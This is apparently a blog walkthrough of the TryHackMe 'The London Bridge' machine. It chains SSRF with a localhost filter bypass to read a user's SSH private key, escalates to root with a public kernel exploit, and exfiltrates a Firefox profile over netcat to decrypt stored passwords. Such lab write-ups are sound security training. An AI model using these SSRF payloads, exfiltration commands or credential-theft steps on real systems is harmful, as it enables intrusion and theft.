---
title: CTF Walkthrough for TryHackMe Machine The London Bridge
date: 2024-09-29 00:00:00 +0300
categories: [Walkthrough, CTF]
tags: [TryHackMe, Writeup, Kernel Exploit, SSRF]   
image:
  path: /assets/img/posts/walthrough/tryhackme/2024-09-29-thelondonbridge/box-thelondonbridge.png
---

## Introduction
Greetings everyone, in this walkthrough, we will talk about The London Bridge a TryHackMe machine. This walkthrough is not only meant to catch the flag but also to demonstrate how a penetration tester will approach this machine in a real-world assessment.
### Machine Description
Name: The London Bridge<br>
Difficulty: Medium<br>
Operating System: Linux<br>
Machine link: [The London Bridge](https://tryhackme.com/r/room/thelondonbridge)<br>
### Tools used
1) Nmap<br>
2) ffuf<br>
3) Zaproxy<br>

## Reconnaissance

We will start by performing a service scan on the target to enumerate services running on open ports.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/The London Bridge/Scans/Service]
└─$ sudo nmap -n 10.10.162.211 -p22,8080 -sV -sC  -oA service-scan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-29 08:02 BST
Stats: 0:00:54 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 08:03 (0:00:53 remaining)
Nmap scan report for 10.10.162.211          
Host is up (0.31s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)            
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)           
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)         
8080/tcp open  http-proxy gunicorn
|_http-title: Explore London
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 29 Sep 2024 07:02:13 GMT
|     Connection: close 
<SNIP>
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.88 seconds
```

The target runs a web server and an SSH server. In our scan result, we can see that the target runs the Gunicorn server. This server is used for Python web applications. We can visit this web application to understand its functioning.
![](/assets/img/posts/walthrough/tryhackme/2024-09-29-thelondonbridge/1-browse.png)

This interface doesn't look interesting so, let's fuzz the web application to uncover hidden directories
```bash
┌──(pentester㉿kali)-[~/…/Challenge/The London Bridge/Scans/Web]
└─$ ffuf -ic -c -u http://10.10.162.211:8080/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt        
<SNIP>

                        [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 433ms]
contact                 [Status: 200, Size: 1703, Words: 549, Lines: 60, Duration: 549ms]
feedback                [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 99ms]
gallery                 [Status: 200, Size: 1892, Words: 530, Lines: 59, Duration: 148ms]
upload                  [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 118ms]
dejaview                [Status: 200, Size: 823, Words: 226, Lines: 33, Duration: 99ms]
                        [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 99ms]
:: Progress: [220546/220546] :: Job [1/1] :: 345 req/sec :: Duration: [0:10:57] :: Errors: 0 ::
```

We have uncovered five hidden pages with our fuzzing. If we visit them one by one we will see that the dejaview page looks interesting since it takes the URL of an image and displays it
![](/assets/img/posts/walthrough/tryhackme/2024-09-29-thelondonbridge/dejaview-page.png)

We can use the link of one image displayed on the *gallery* page to test the functionality of the dejaview page. In our case, we will use the following link ```http://10.10.162.211:8080/uploads/www.usnews.jpeg```.
![](/assets/img/posts/walthrough/tryhackme/2024-09-29-thelondonbridge/view_image-page.png)

When we enter the link, the image is displayed and we are redirected to the view_image endpoint. When we try to access this link directly from our browse we see an error that the HTTP method i.e. GET is not allowed.
![](/assets/img/posts/walthrough/tryhackme/2024-09-29-thelondonbridge/view_image-error.png)

If an endpoint doesn't support a GET method in most cases it will support the POST method and if an endpoint allows the POST method it will likely have parameters. Let's fuzz the parameters used by this page.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/The London Bridge/Scans/Web]
└─$ ffuf -ic -c -u http://10.10.162.211:8080/view_image -X POST -H "Content-Type: application/x-www-form-urlencoded"  -d "FUZZ=test" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -fs 823
<SNIP>

www                     [Status: 500, Size: 290, Words: 37, Lines: 5, Duration: 127ms]
:: Progress: [87651/87651] :: Job [1/1] :: 345 req/sec :: Duration: [0:7:57] :: Errors: 0 ::
```

The fuzzing was successful and we identified the **www*** parameter.  Since the page is named view_image, we can assume that it is used to view images. Let's try to view an image from our command line using the same link we used above.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/The London Bridge/Scans/Web]
└─$ curl http://10.10.162.211:8080/view_image -X POST -d "www=http://10.10.162.211:8080/uploads/www.usnews.jpeg"
Warning: Binary output can mess up your terminal. Use "--output -" to tell 
Warning: curl to output it to your terminal anyway, or consider "--output 
Warning: <FILE>" to save to a file.
```

Curl signal that it is about to display a binary file. This tells us that the image was fetched. We can now try to check if this server can display images/files from external links. To check this we will create a fake file and host it on a simple PHP server.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ echo 'This is an SSRF test file' > test.txt                                  

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ php -S 0.0.0.0:80
[Sun Sep 29 09:38:47 2024] PHP 8.2.21 Development Server (http://0.0.0.0:80) started
```

Now, we passed our IP address and the name of the file we created to the www parameter.
```bash
┌──(pentester㉿kali)-[~/…/Challenge/The London Bridge/Scans/Web]
└─$ curl http://10.10.162.211:8080/view_image -X POST -d "www=http://10.8.23.19/test.txt"
This is an SSRF test file  
```

## Exploitation

Our file was imported by the server and displayed to us. We can conclude that this server is vulnerable to SSRF. Before launching our PORT scanning attack we can notice that if we try to access port 8080 using the local IP address ```127.0.0.1``` we will receive a forbidden message and this goes with any port we try to access.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ curl http://10.10.162.211:8080/view_image -X POST -d "www=http://127.0.0.1:8080" 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>403 Forbidden</title>
<h1>Forbidden</h1>
<p>You don&#x27;t have the permission to access the requested resource. It is either read-protected or not readable by the server.</p>
```

This could be due to some sort of URL format filtering put in place by the web developer. We can reference this [list](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/url-format-bypass) for ways to bypass these filters.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ curl http://10.10.162.211:8080/view_image -X POST -d "www=http://127.1:8080"     
<!DOCTYPE html>                    
<html lang="en">          
<head>                         
    <meta charset="UTF-8">  
<SNIP>
</html>
```

We see that the response looks normal when the format ```http://127.1:8080``` is used instead of ```http://127.1:8080```. We can now use the same URL format to perform our internal port scan. We first need to create a wordlist with all available ports and only after we will start the fuzzing attack.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ seq 0 65535 >  port-list.txt 

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ ffuf -ic -c -u http://10.10.162.211:8080/view_image -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "www=http://127.1:FUZZ"  -w port-list.txt -fs 290 
<SNIP>
0                       [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 307ms]
80                      [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 307ms]
8080                    [Status: 200, Size: 2682, Words: 871, Lines: 83, Duration: 153ms]
:: Progress: [65536/65536] :: Job [1/1] :: 259 req/sec :: Duration: [0:04:18] :: Errors: 0 ::
```

We discover a new open port i.e. port 80 listening on the target's internal IP address. Let's access this port. 
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ curl http://10.10.162.211:8080/view_image -X POST -d "www=http://127.1:80"   
<HTML>
<body bgcolor="gray">
<SNIP>
</body>
</HTML>
```

The port is indeed accessible. We can now fuzz the web application to uncover hidden directories.
```bash
┌──(pentester㉿kali)-[~/Desktop/TryHackMe/Challenge/The London Bridge]
└─$ ffuf -ic -c -u http://10.10.162.211:8080/view_image -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "www=http://127.1:80/FUZZ"  -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt -fs 469
<SNIP>
.bash_history           [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 132ms]
.bash_logout            [Status: 200, Size: 220, Words: 35, Lines: 8, Duration: 215ms]
%3f/                    [Status: 200, Size: 1270, Words: 230, Lines: 37, Duration: 215ms]
.cache/                 [Status: 200, Size: 474, Words: 19, Lines: 18, Duration: 218ms]
.cache                  [Status: 200, Size: 474, Words: 19, Lines: 18, Duration: 265ms]
.bashrc                 [Status: 200, Size: 3771, Words: 522, Lines: 118, Duration: 268ms]
.env                    [Status: 200, Size: 533, Words: 22, Lines: 21, Duration: 163ms]
.local                  [Status: 200, Size: 414, Words: 19, Lines: 18, Duration: 176ms]
.profile                [Status: 200, Size: 807, Words: 128, Lines: 28, Duration: 131ms]
.selected_editor        [Status: 200, Size: 66, Words: 4, Lines: 3, Duration: 99ms]
.ssh                    [Status: 200, Size: 399, Words: 18, Lines: 17, Duration: 119ms]
.ssh/id_rsa             [Status: 200, Size: 1675, Words: 7, Lines: 28, Duration: 126ms]
.ssh/authorized_keys    [Status: 200, Size: 393, Words: 3, Lines: 2, Duration: 143ms]
localhost.old           [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 101ms]
localhost.rdb           [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 115ms]
localhost.sql           [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 115ms]
localhost.rar           [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 118ms]
localhost.sqlite        [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 111ms]
localhost.tag.gz        [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 105ms]
localhost.tar           [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 106ms]
localhost.tar.bz2       [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 105ms]
localhost.tar.gz        [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 104ms]
localhost.tgz           [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 98ms]
localhost.zipu          [Status: 403, Size: 239, Words: 27, Lines: 5, Duration: 101ms]
templates/              [Status: 200, Size: 1294, Words: 358, Lines: 44, Duration: 131ms]
uploads/                [Status: 200, Size: 722, Words: 25, Lines: 24, Duration: 166ms]
:: Progress: [2565/2565] :: Job [1/1] :: 176 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

We see uncover a lot of hidden directories. The presence of .profile, .bash_history, .bash_logout, and .bashrc files indicates that the web root's directory may be a local user's home directory. Our fuzzing uncovered two interesting files i.e. .ssh/id_rsa and .ssh/authorized_keys. Let's access these files.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ curl http://10.10.162.211:8080/view_image -X POST -d "www=http://127.1:80/.ssh/id_rsa"   
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAz1yFrg9FAZAI4R37aQWn/ePTk/MKfz2KQ+OE45KErguL34Yj
5Kc1VJjDTTNRmc+vNRZieC8EwelWgpwcKACa70Ke2q/7zRLWHh23OUxWiSAAORTe
<SNIP>
a7RMp/cXWZKdyRgFxQ7DQEorzWi5bLAyxXnMg0ghwWdf4nugQmaEG7t+OYUNsf7M
fDLzMA915WcODR6L0mWO0crAMbZQOkg1KlAiwQSQmuUpPqyAfq6x
-----END RSA PRIVATE KEY-----

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ curl http://10.10.162.211:8080/view_image -X POST -d "www=http://127.1:80/.ssh/authorized_keys" 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDPXIWuD0UBkAjhHftpBaf949OT8wp/PYpD44TjkoSuC4vfhiPkpzVUmMNNM1GZz681FmJ4LwTB6VaCnBwoAJrvQp7ar/vNEtYeHbc5TFaJIAA5FN5rWzl66zeCFNaNx841E4CQSDs7dew3CCn3dRQHzBtT4AOlmcUs9QMSsUqhKn53EbivHCqkCnqZqqwTh0hkd0Cr5i3r/Yc4REqsVaI41Cl3pkDxrfbmhZdjxRpES8pO5dyOUvnq3iJZDOxFBsG8H4RODaZrTW78eZbcz1LKug/KlwQ6q8+e4+mpcdm7sHAAszk0eFcI2a37QQ4Fgq96OwMDo15l8mDDrk1Ur7aF beth@london
```

These files indeed contained the SSH private and public keys of a local user. The name of this user can be seen in the authorized_keys file and it appears to be beth. Let's download the private key and log in as the user Beth.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ curl -s http://10.10.162.211:8080/view_image -X POST -d "www=http://127.1:80/.ssh/id_rsa"  > beth_id_rsa; chmod 600 beth_id_rsa

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ ssh beth@10.10.162.211 -i beth_id_rsa 
The authenticity of host '10.10.162.211 (10.10.162.211)' can't be established.
<SNIP>
Last login: Mon May 13 22:38:30 2024 from 192.168.62.137
beth@london:~$ ls __pycache__/
app.cpython-36.pyc  gunicorn_config.cpython-36.pyc  user.txt
```

## Post Exploitation

At this stage in our assessment, we have obtained a foothold on the target and obtained the user flag on the system. We can use this foothold to enumerate further our enumeration. During our enumeration, will notice that the target's kernel is very old.
```bash
beth@london:/tmp$ uname -a 
Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

A Google search reveals that this kernel version has a privilege escalation vulnerability.
![](/assets/img/posts/walthrough/tryhackme/2024-09-29-thelondonbridge/exploit-identify.png)

This vulnerability can be exploited in different ways depending on what is present on the target. So let's download the Github repository containing the different POCs for this vulnerability and transfer it to our target using SSH.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ wget https://github.com/scheatkode/CVE-2018-18955/archive/refs/heads/main.zip
--2024-09-29 11:00:00--  https://github.com/scheatkode/CVE-2018-18955/archive/refs/heads/main.zip
<SNIP>
2024-09-29 11:00:03 (103 KB/s) - ‘main.zip.1’ saved [11544]

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ unzip main.zip                                                               
Archive:  main.zip
da66cdc61c6be2c5049abe3239ecc5a317f5e48c
   creating: CVE-2018-18955-main/
<SNIP> 
  inflating: CVE-2018-18955-main/subuid_shell.c  

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ ls
CVE-2018-18955-main  beth_id_rsa  main.zip  port-list.txt

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ scp  -i beth_id_rsa -r ./CVE-2018-18955-main  beth@10.10.162.211:/tmp/ 
libsubuid.c                                                                                                                                                100%  357     1.4KB/s   00:00    
README.md                                                                                                                                                  100% 1252     6.9KB/s   00:00    
exploit.polkit.sh                                                                                                                                          100% 3218     7.7KB/s   00:00    
build.yaml                                                                                                                                                 100% 2209    18.9KB/s   00:00    
exploit.dbus.sh                                                                                                                                            100% 4223    13.4KB/s   00:00    
exploit.cron.sh                                                                                                                                            100% 2693     8.6KB/s   00:00    
exploit.ldpreload.sh                                                                                                                                       100% 2467    17.7KB/s   00:00    
rootshell.c                                                                                                                                                100%  147     0.5KB/s   00:00    
exploit.bash_completion.sh                                                                                                                                 100% 2448    20.8KB/s   00:00    
subuid_shell.c                                                                                                                                             100% 6540    20.8KB/s   00:00    
subshell.c 
```

We can now navigate to the /tmp directory on the target and run the *exploit.dbus.sh* variation of this POC to obtain a root shell.
```bash
beth@london:/tmp/CVE-2018-18955-main$ ls
exploit.bash_completion.sh  exploit.cron.sh  exploit.dbus.sh  exploit.ldpreload.sh  exploit.polkit.sh  libsubuid.c  README.md  rootshell.c  subshell.c  subuid_shell.c
beth@london:/tmp/CVE-2018-18955-main$ ./exploit.dbus.sh 
[*] Compiling...
[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
<SNIP>
[*] Cleaning up...
[*] Launching root shell: /tmp/sh

root@london:/tmp/CVE-2018-18955-main# su
root@london:/tmp/CVE-2018-18955-main# ls -la /root
total 52
<SNIP>
-rw-rw-r--  1 root root   27 Sep 18  2023 .root.txt
<SNIP>
```

With this, we have obtained a root shell on the target and we can read the root flag. The last task is to identify the password of the user Charle. Before we attempt to crack the password in the /etc/shadow file, let's first enumerate the user's home directory.
```bash
root@london:/tmp/CVE-2018-18955-main# ls -la  /home/charles/
total 24
<SNIP>
drw------- 3 charles charles 4096 Mar 16  2024 .mozilla
-rw------- 1 charles charles  807 Mar 10  2024 .profile
```

This user's home directory contains the .mozilla folder. This folder contains login credentials stored by the Mozilla browser. Let's archive this file and send it to our attack host to extract the passwords.
```bash
root@london:/home/charles/.mozilla# tar -czf /tmp/firefox.tar.gz firefox/
```

After we have archived the file, we can start the listener on our attack host and send the file from the target to our attack host
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ nc -lvnp 4444 > firefox.tar.gz
listening on [any] 4444 ...
```

```bash
root@london:/home/charles/.mozilla# nc -q 0 10.8.23.19 4444 < /tmp/firefox.tar.gz 
root@london:/home/charles/.mozilla# 
```

Now that we have the file on our attack host, we can de-archive it and use the Python [firefox_decryptor](https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py) script to extract credentials stored in the browser's database.
```bash
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ tar -xf firefox.tar.gz  

┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ chmod -R 755 firefox
┌──(pentester㉿kali)-[~/…/TryHackMe/Challenge/The London Bridge/Misc File]
└─$ python3 /opt/firefox_decryptor.py firefox/8k3bf3zp.charles/
2024-09-29 11:53:15,686 - WARNING - profile.ini not found in firefox/8k3bf3zp.charles/
2024-09-29 11:53:15,688 - WARNING - Continuing and assuming 'firefox/8k3bf3zp.charles/' is a profile location

Website:   https://www.buckinghampalace.com
Username: 'Charles'
Password: <REDACTED>
```

The browser indeed contained a pair of credentials belonging to Charles.

## Conclusions

Congratulations! In this walkthrough, you have leveraged an SSRF vulnerability to read local files on the system. Finally, you have exploited an outdated shell version to obtain root access.
This machine was designed to show how poor patching practices and poor user input validation could seriously affect the security posture of an organisation. Thanks for following up on this walkthrough.
